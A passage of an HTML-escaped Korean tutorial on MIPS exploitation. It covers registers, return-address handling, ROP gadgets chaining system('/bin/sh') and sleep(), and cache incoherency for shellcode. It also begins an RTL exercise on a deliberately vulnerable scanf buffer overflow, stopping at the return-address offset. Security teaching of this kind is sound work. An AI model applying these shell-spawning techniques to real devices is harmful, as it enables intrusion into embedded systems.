&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;&lt;code&gt;$gp&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;&lt;code&gt;$28&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&amp;#xC804;&amp;#xC5ED; &amp;#xD3EC;&amp;#xC778;&amp;#xD130;&amp;#xC758; &amp;#xAC12;&amp;#xC744; &amp;#xC800;&amp;#xC7A5;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;&lt;code&gt;$sp&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;&lt;code&gt;$29&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&amp;#xC2A4;&amp;#xD0DD; &amp;#xD3EC;&amp;#xC778;&amp;#xD130;&amp;#xC758; &amp;#xAC12;&amp;#xC744; &amp;#xC800;&amp;#xC7A5;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;&lt;code&gt;$fp&lt;/code&gt;/&lt;code&gt;$s8&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;&lt;code&gt;$30&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&amp;#xD504;&amp;#xB808;&amp;#xC784; &amp;#xD3EC;&amp;#xC778;&amp;#xD130;&amp;#xC758; &amp;#xAC12;&amp;#xC744; &amp;#xC800;&amp;#xC7A5;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;&lt;code&gt;$ra&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;&lt;code&gt;$31&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&amp;#xC8FC;&amp;#xC18C; &amp;#xBC18;&amp;#xD658;&amp;#xAC12;&amp;#xC744; &amp;#xC800;&amp;#xC7A5;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;
&lt;p&gt;&amp;#xC774;&amp;#xC911; &amp;#xB208; &amp;#xC5EC;&amp;#xACA8; &amp;#xBD10;&amp;#xC57C; &amp;#xD560; &amp;#xB808;&amp;#xC9C0;&amp;#xC2A4;&amp;#xD130;&amp;#xB294; &lt;code&gt;ra&lt;/code&gt;, &lt;code&gt;sp&lt;/code&gt;, &lt;code&gt;s8&lt;/code&gt;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;MIPS&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &lt;code&gt;ra&lt;/code&gt; &amp;#xB808;&amp;#xC9C0;&amp;#xC2A4;&amp;#xD130;&amp;#xAC00; &amp;#xD568;&amp;#xC218; &amp;#xB9AC;&amp;#xD134; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xAC00;&amp;#xC9D1;&amp;#xB2C8;&amp;#xB2E4;. x86/x64&amp;#xC758; &lt;code&gt;RET&lt;/code&gt;&amp;#xC758; &amp;#xC5ED;&amp;#xD560;&amp;#xC744; &amp;#xD55C;&amp;#xB2E4;&amp;#xACE0; &amp;#xC0DD;&amp;#xAC01;&amp;#xD558;&amp;#xBA74; &amp;#xD3B8;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs nasm&#34;&gt;0x00400734 &amp;lt;main+0&amp;gt;:    addiu   sp,sp,-136
0x00400738 &amp;lt;main+4&amp;gt;:    sw      ra,132(sp)
0x0040073c &amp;lt;main+8&amp;gt;:    sw      s8,128(sp)
0x00400740 &amp;lt;main+12&amp;gt;:   move    s8,sp
...
0x004007d8 &amp;lt;main+164&amp;gt;:  move    sp,s8
0x004007dc &amp;lt;main+168&amp;gt;:  lw      ra,132(sp)
0x004007e0 &amp;lt;main+172&amp;gt;:  lw      s8,128(sp)
0x004007e4 &amp;lt;main+176&amp;gt;:  addiu   sp,sp,136
0x004007e8 &amp;lt;main+180&amp;gt;:  jr      ra&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xD568;&amp;#xC218; &amp;#xD504;&amp;#xB864;&amp;#xB85C;&amp;#xADF8;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &lt;code&gt;ra&lt;/code&gt; &amp;#xB808;&amp;#xC9C0;&amp;#xC2A4;&amp;#xD130;&amp;#xC5D0; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xB294; &amp;#xB9AC;&amp;#xD134; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xC2A4;&amp;#xD0DD;&amp;#xC5D0; &amp;#xC800;&amp;#xC7A5;&amp;#xD558;&amp;#xACE0;, &amp;#xD568;&amp;#xC218; &amp;#xC5D0;&amp;#xD544;&amp;#xB85C;&amp;#xADF8;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &lt;code&gt;ra&lt;/code&gt; &amp;#xB808;&amp;#xC9C0;&amp;#xC2A4;&amp;#xD130;&amp;#xC5D0; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xB294; &amp;#xB9AC;&amp;#xD134; &amp;#xC8FC;&amp;#xC18C;&amp;#xB85C; &amp;#xC774;&amp;#xB3D9;&amp;#xD558;&amp;#xB294; &amp;#xAD6C;&amp;#xC870;&amp;#xB85C; &amp;#xC774;&amp;#xB8E8;&amp;#xC5B4;&amp;#xC9D1;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ra&lt;/code&gt; &amp;#xB808;&amp;#xC9C0;&amp;#xC2A4;&amp;#xD130;&amp;#xB294; &lt;code&gt;sp&lt;/code&gt;(&amp;#xD604;&amp;#xC7AC; &amp;#xC2A4;&amp;#xD0DD; &amp;#xD3EC;&amp;#xC778;&amp;#xD130;)&amp;#xC640; &lt;code&gt;s8&lt;/code&gt;(&amp;#xD504;&amp;#xB808;&amp;#xC784; &amp;#xD3EC;&amp;#xC778;&amp;#xD130;) &amp;#xB808;&amp;#xC9C0;&amp;#xC2A4;&amp;#xD130;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xB9AC;&amp;#xD134; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xC2A4;&amp;#xD0DD;&amp;#xC5D0; &amp;#xC800;&amp;#xC7A5;&amp;#xD558;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0;, &lt;code&gt;sp&lt;/code&gt; &amp;#xB808;&amp;#xC9C0;&amp;#xC2A4;&amp;#xD130;&amp;#xB97C; &amp;#xAE30;&amp;#xC900;&amp;#xC73C;&amp;#xB85C; &amp;#xBC84;&amp;#xD37C; &amp;#xC2DC;&amp;#xC791; &amp;#xC704;&amp;#xCE58;&amp;#xC640; &amp;#xB9AC;&amp;#xD134; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xACC4;&amp;#xC0B0;&amp;#xD558;&amp;#xC5EC; &amp;#xC624;&amp;#xD504;&amp;#xC14B;&amp;#xC744; &amp;#xAD6C;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC774; &amp;#xC2A4;&amp;#xD0DD; &amp;#xAE30;&amp;#xBC18; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787;&amp;#xC758; &amp;#xCCAB;&amp;#xAC78;&amp;#xC74C;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs nasm&#34;&gt;lw      $s2, 24(sp)      ; sp+24 &amp;#xC704;&amp;#xCE58;&amp;#xC758; &amp;#xAC12;&amp;#xC744; $s2&amp;#xC5D0; &amp;#xB85C;&amp;#xB4DC; (&amp;amp;&amp;quot;/bin/sh&amp;quot; &amp;#xC8FC;&amp;#xC18C;)
lw      $s1, 20(sp)      ; sp+20 &amp;#xC704;&amp;#xCE58;&amp;#xC758; &amp;#xAC12;&amp;#xC744; $s1&amp;#xC5D0; &amp;#xB85C;&amp;#xB4DC; (&amp;amp;system &amp;#xC8FC;&amp;#xC18C;)
lw      $s0, 16(sp)      ; sp+16 &amp;#xC704;&amp;#xCE58;&amp;#xC758; &amp;#xAC12;&amp;#xC744; $s0&amp;#xC5D0; &amp;#xB85C;&amp;#xB4DC; (&amp;amp;sleep &amp;#xC8FC;&amp;#xC18C;)
lw      $ra, 28(sp)      ; sp+28 &amp;#xC704;&amp;#xCE58;&amp;#xC758; &amp;#xAC12;&amp;#xC744; $ra&amp;#xC5D0; &amp;#xB85C;&amp;#xB4DC; (&amp;#xB2E4;&amp;#xC74C; &amp;#xAC00;&amp;#xC82F; &amp;#xC8FC;&amp;#xC18C;)
addiu   sp, sp, 32       ; &amp;#xC2A4;&amp;#xD0DD; &amp;#xD3EC;&amp;#xC778;&amp;#xD130; &amp;#xC815;&amp;#xB9AC;
jr      $ra              ; $ra(&amp;#xB2E4;&amp;#xC74C; &amp;#xAC00;&amp;#xC82F;)&amp;#xB85C; &amp;#xC810;&amp;#xD504;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xC774;&amp;#xD6C4;&amp;#xC5D0; &amp;#xC124;&amp;#xBA85;&amp;#xD560; Shellcode &amp;#xBC0F; ROP &amp;#xCCB4;&amp;#xC778;&amp;#xC5D0;&amp;#xC11C; &amp;#xD544;&amp;#xC694;&amp;#xD55C; &amp;#xAC00;&amp;#xC82F;&amp;#xC758; &amp;#xD615;&amp;#xD0DC;&amp;#xB97C; &amp;#xC704;&amp;#xC640; &amp;#xAC19;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;s0-s7&lt;/code&gt; &amp;#xB808;&amp;#xC9C0;&amp;#xC2A4;&amp;#xD130;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xC2A4;&amp;#xD0DD; &amp;#xB0B4; &amp;#xAC12;&amp;#xC744; &lt;code&gt;lw&lt;/code&gt; &amp;#xBA85;&amp;#xB839;&amp;#xC5B4;&amp;#xB85C; &amp;#xB85C;&amp;#xB4DC;&amp;#xD558;&amp;#xACE0;, &lt;code&gt;addiu&lt;/code&gt;&amp;#xB85C; &amp;#xC2A4;&amp;#xD0DD; &amp;#xD3EC;&amp;#xC778;&amp;#xD130;&amp;#xB97C; &amp;#xC815;&amp;#xB9AC;&amp;#xD55C; &amp;#xD6C4;, &amp;#xB9AC;&amp;#xD134; &amp;#xC8FC;&amp;#xC18C;&amp;#xB85C; &lt;code&gt;jr&lt;/code&gt;&amp;#xD558;&amp;#xB294; &amp;#xD615;&amp;#xD0DC;&amp;#xAC00; &amp;#xAC00;&amp;#xC7A5; &amp;#xAE30;&amp;#xBCF8;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xAC00;&amp;#xC7A5; &amp;#xAE30;&amp;#xBCF8;&amp;#xC801;&amp;#xC778; &amp;#xD615;&amp;#xD0DC;&amp;#xC774;&amp;#xBBC0;&amp;#xB85C;, &amp;#xC0C1;&amp;#xD669;&amp;#xACFC; &amp;#xD658;&amp;#xACBD;&amp;#xC5D0; &amp;#xB9DE;&amp;#xCDB0; &amp;#xD544;&amp;#xC694;&amp;#xD55C; &amp;#xC778;&amp;#xC790;&amp;#xC640; &amp;#xBA85;&amp;#xB839;&amp;#xC5B4;&amp;#xB97C; &amp;#xC798; &amp;#xC870;&amp;#xD569;&amp;#xD558;&amp;#xBA74; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs nasm&#34;&gt;move    $t9, $s1         ; $s1(system &amp;#xC8FC;&amp;#xC18C;)&amp;#xC744; $t9(&amp;#xD638;&amp;#xCD9C;&amp;#xC6A9; &amp;#xB808;&amp;#xC9C0;&amp;#xC2A4;&amp;#xD130;)&amp;#xB85C; &amp;#xC774;&amp;#xB3D9;
jalr    $t9              ; $t9&amp;#xC5D0; &amp;#xC788;&amp;#xB294; &amp;#xC8FC;&amp;#xC18C;&amp;#xB85C; &amp;#xC810;&amp;#xD504;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xD568;&amp;#xC218; &amp;#xC2E4;&amp;#xD589;&amp;#xC740; &lt;code&gt;jalr&lt;/code&gt; &amp;#xBA85;&amp;#xB839;&amp;#xC744; &amp;#xD1B5;&amp;#xD574; &amp;#xC774;&amp;#xB8E8;&amp;#xC5B4;&amp;#xC9D1;&amp;#xB2C8;&amp;#xB2E4;. x86-64&amp;#xC758; &lt;code&gt;call&lt;/code&gt;&amp;#xACFC; &amp;#xAC19;&amp;#xC740; &amp;#xBA85;&amp;#xB839;&amp;#xCC98;&amp;#xB7FC; &amp;#xB3D9;&amp;#xC791; &amp;#xB41C;&amp;#xB2E4;&amp;#xACE0; &amp;#xC774;&amp;#xD574;&amp;#xD558;&amp;#xC2DC;&amp;#xBA74; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h2 id=&#34;3-Cache-Incoherency&#34;&gt;&lt;a href=&#34;#3-Cache-Incoherency&#34; class=&#34;headerlink&#34; title=&#34;3. Cache Incoherency&#34;&gt;&lt;/a&gt;3. Cache Incoherency&lt;/h2&gt;&lt;p&gt;MIPS &amp;#xD658;&amp;#xACBD;&amp;#xC73C;&amp;#xB85C; &amp;#xAD6C;&amp;#xC131;&amp;#xB41C; &amp;#xC2E4;&amp;#xC81C; &amp;#xC7A5;&amp;#xBE44;&amp;#xB97C; &amp;#xC775;&amp;#xC2A4;&amp;#xD560; &amp;#xB54C;, IoT/&amp;#xC784;&amp;#xBCA0;&amp;#xB514;&amp;#xB4DC; &amp;#xC7A5;&amp;#xBE44; &amp;#xD2B9;&amp;#xC131; &amp;#xC0C1; Shellcode&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD560; &amp;#xACBD;&amp;#xC6B0;&amp;#xAC00; &amp;#xC874;&amp;#xC7AC;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xADF8;&amp;#xB7EC;&amp;#xB098; MIPS &amp;#xD658;&amp;#xACBD;&amp;#xC5D0;&amp;#xC11C; Shellcode&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD560; &amp;#xB54C;&amp;#xB294; &amp;#xC8FC;&amp;#xC758;&amp;#xD560; &amp;#xC810;&amp;#xC774; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xBC14;&amp;#xB85C; Cache&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image3.png&#34; alt=&#34;image3.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;MIPS&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; opcode&amp;#xAC00; &amp;#xB4E4;&amp;#xC5B4;&amp;#xC788;&amp;#xB294; Instruction Cache, &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &amp;#xAE30;&amp;#xB85D;&amp;#xD558;&amp;#xB294; Data Cache &amp;#xB450; &amp;#xAC00;&amp;#xC9C0;&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xC774;&amp;#xB54C;, &amp;#xC6B0;&amp;#xB9AC;&amp;#xAC00; &amp;#xC785;&amp;#xB825;&amp;#xD558;&amp;#xB294; &amp;#xAC12;(Shellcode)&amp;#xC740; Data Cache&amp;#xB85C; &amp;#xB4E4;&amp;#xC5B4;&amp;#xAC00;&amp;#xAC8C; &amp;#xB418;&amp;#xB294;&amp;#xB370;, CPU&amp;#xB294; &amp;#xAE30;&amp;#xC874;&amp;#xC5D0; &amp;#xBA85;&amp;#xB839;&amp;#xC774; &amp;#xB4E4;&amp;#xC5B4;&amp;#xAC04; Instruction Cache&amp;#xB97C; &amp;#xC2E4;&amp;#xD589;&amp;#xD558;&amp;#xB294; Cache Incoherency(&amp;#xCE90;&amp;#xC2DC; &amp;#xBE44;&amp;#xC77C;&amp;#xAD00;&amp;#xC131;) &amp;#xBB38;&amp;#xC81C;&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xC774;&amp;#xB97C; &amp;#xD574;&amp;#xACB0;&amp;#xD558;&amp;#xAE30; &amp;#xC704;&amp;#xD574;&amp;#xC11C;&amp;#xB294; Data Cache&amp;#xC5D0;&amp;#xC11C; Instruction Cache&amp;#xB85C; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &amp;#xAC00;&amp;#xC838;&amp;#xC640;&amp;#xC57C; &amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xB294; Cache &amp;#xC4F0;&amp;#xAE30; &amp;#xC815;&amp;#xCC45;&amp;#xC5D0; &amp;#xB530;&amp;#xB77C;, &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xC640; &amp;#xB3D9;&amp;#xAE30;&amp;#xD654; &amp;#xD55C; &amp;#xD6C4; Instruction Cache&amp;#xB97C; &amp;#xBE44;&amp;#xC6B0;&amp;#xAC8C; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC5EC;&amp;#xAE30;&amp;#xC11C; &amp;#xC911;&amp;#xC694;&amp;#xD55C; &amp;#xAC83;&amp;#xC740; &amp;#xBC14;&amp;#xB85C; Data Cache&amp;#xB97C; flush&amp;#xD558;&amp;#xC5EC; Cache write&amp;#xB97C; &amp;#xD574;&amp;#xC57C; &amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image4.png&#34; alt=&#34;image4.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;Data Cache&amp;#xAC00; flush&amp;#xAC00; &amp;#xB41C; &amp;#xD6C4;&amp;#xC758; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xC640; Cache &amp;#xC0C1;&amp;#xD0DC;&amp;#xB294; &amp;#xC704;&amp;#xC640; &amp;#xAC19;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. Instruction Cache&amp;#xC640; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC; &amp;#xBA85;&amp;#xB839;&amp;#xC774; &amp;#xB3D9;&amp;#xC77C;&amp;#xD558;&amp;#xC9C0; &amp;#xC54A;&amp;#xC73C;&amp;#xBBC0;&amp;#xB85C;, Instruction Cache&amp;#xB97C; &amp;#xBE44;&amp;#xC6C1;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xADF8;&amp;#xB9AC;&amp;#xACE0; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xC640; &amp;#xB3D9;&amp;#xAE30;&amp;#xD654; &amp;#xB41C; Data Cache&amp;#xC5D0; &amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xC2E4;&amp;#xD589;&amp;#xD558;&amp;#xAC8C; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xC774;&amp;#xB7F0; &amp;#xACFC;&amp;#xC815;&amp;#xC744; &amp;#xAC70;&amp;#xCCD0;&amp;#xC57C; &amp;#xBE44;&amp;#xB85C;&amp;#xC18C; &amp;#xC0BD;&amp;#xC785;&amp;#xD55C; Shellcode&amp;#xAC00; &amp;#xC2E4;&amp;#xD589;&amp;#xC774; &amp;#xB420; &amp;#xC218; &amp;#xC788;&amp;#xB294; &amp;#xD750;&amp;#xB984;&amp;#xC774; &amp;#xB41C;&amp;#xB2E4;&amp;#xACE0; &amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image5.png&#34; alt=&#34;image5.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xAC00;&amp;#xC7A5; &amp;#xC190;&amp;#xC26C;&amp;#xC6B4; &amp;#xBC29;&amp;#xBC95;&amp;#xC740; &lt;code&gt;sleep()&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sleep()&lt;/code&gt; &amp;#xD638;&amp;#xCD9C; &amp;#xC2DC;, &amp;#xB2E4;&amp;#xB978; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4;&amp;#xB098; &amp;#xC2A4;&amp;#xB808;&amp;#xC2A4;&amp;#xC5D0; &amp;#xC2E4;&amp;#xD589;&amp;#xC774; &amp;#xB118;&amp;#xC5B4;&amp;#xAC00;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0;, Data Cache&amp;#xC5D0; &amp;#xB2E4;&amp;#xB978; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB4E4;&amp;#xC774; &amp;#xC0DD;&amp;#xC131;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xD6C4; Cache &amp;#xC4F0;&amp;#xAE30; &amp;#xC815;&amp;#xCC45;&amp;#xC5D0; &amp;#xB530;&amp;#xB77C;, flush&amp;#xAC00; &amp;#xB418;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xC5D0; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xB294; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB3C4; Data Cache&amp;#xAC00; write &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xB530;&amp;#xB77C;&amp;#xC11C;, MIPS &amp;#xD658;&amp;#xACBD;&amp;#xC5D0;&amp;#xC11C; shellcode&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD55C;&amp;#xB2E4;&amp;#xBA74;, &lt;code&gt;sleep()&lt;/code&gt; &amp;#xD638;&amp;#xCD9C;&amp;#xC744; &amp;#xD1B5;&amp;#xD574; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787;&amp;#xC744; &amp;#xAD6C;&amp;#xC131;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC774; &amp;#xC88B;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h2 id=&#34;4-MIPS-Exploit-Practice&#34;&gt;&lt;a href=&#34;#4-MIPS-Exploit-Practice&#34; class=&#34;headerlink&#34; title=&#34;4. MIPS Exploit Practice&#34;&gt;&lt;/a&gt;4. MIPS Exploit Practice&lt;/h2&gt;&lt;p&gt;&amp;#xAC04;&amp;#xB2E8;&amp;#xD55C; &amp;#xC608;&amp;#xC81C;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574;&amp;#xC11C; MIPS &amp;#xD658;&amp;#xACBD;&amp;#xC5D0;&amp;#xC11C;&amp;#xC758; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787;&amp;#xC744; &amp;#xC5F0;&amp;#xC2B5;&amp;#xD574;&amp;#xBCF4;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h3 id=&#34;4-1-RTL&#34;&gt;&lt;a href=&#34;#4-1-RTL&#34; class=&#34;headerlink&#34; title=&#34;4-1: RTL&#34;&gt;&lt;/a&gt;4-1: RTL&lt;/h3&gt;&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/span&gt;

&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;target&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
        system(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;);
}

&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; argc, &lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt; *argv[])&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
        setvbuf(&lt;span class=&#34;hljs-built_in&#34;&gt;stdout&lt;/span&gt;, &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;, _IONBF, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);

        &lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt; buf[&lt;span class=&#34;hljs-number&#34;&gt;100&lt;/span&gt;];
        &lt;span class=&#34;hljs-built_in&#34;&gt;scanf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;%s&amp;quot;&lt;/span&gt;, buf);
        &lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;%s\n&amp;quot;&lt;/span&gt;, buf);
        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;MIPS &amp;#xD658;&amp;#xACBD;&amp;#xC5D0;&amp;#xC11C;&amp;#xC758; &amp;#xAE30;&amp;#xBCF8;&amp;#xC801;&amp;#xC778; RTL&amp;#xC744; &amp;#xD1B5;&amp;#xD574; &amp;#xC2A4;&amp;#xD0DD; &amp;#xB0B4; offset&amp;#xC744; &amp;#xAD6C;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC744; &amp;#xD574;&amp;#xBCF4;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xCDE8;&amp;#xC57D;&amp;#xD55C; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xC0DD;&amp;#xC131;&amp;#xD558;&amp;#xC5EC; bof&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xB294; &amp;#xC608;&amp;#xC81C; &amp;#xCF54;&amp;#xB4DC;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs nasm&#34;&gt;0x00400738 &amp;lt;main+4&amp;gt;:    sw      ra,132(sp)  ; ret
0x0040073c &amp;lt;main+8&amp;gt;:    sw      s8,128(sp)
0x00400740 &amp;lt;main+12&amp;gt;:	  move	  s8,sp
...
0x0040079c &amp;lt;main+104&amp;gt;:	addiu	  v0,s8,24  ; buf
0x004007a0 &amp;lt;main+108&amp;gt;:	move	  a1,v0
...
0x004007b0 &amp;lt;main+124&amp;gt;:	jalr	  t9  ; scanf&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;gdb&amp;#xB85C; &amp;#xC5B4;&amp;#xC148;&amp;#xC744; &amp;#xD655;&amp;#xC778;&amp;#xD558;&amp;#xBA74; &amp;#xB2E4;&amp;#xC74C;&amp;#xACFC; &amp;#xAC19;&amp;#xC740; offset&amp;#xC744; &amp;#xAD6C;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&amp;#xB9AC;&amp;#xD134; &amp;#xC8FC;&amp;#xC18C;: &lt;code&gt;sp + 132&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
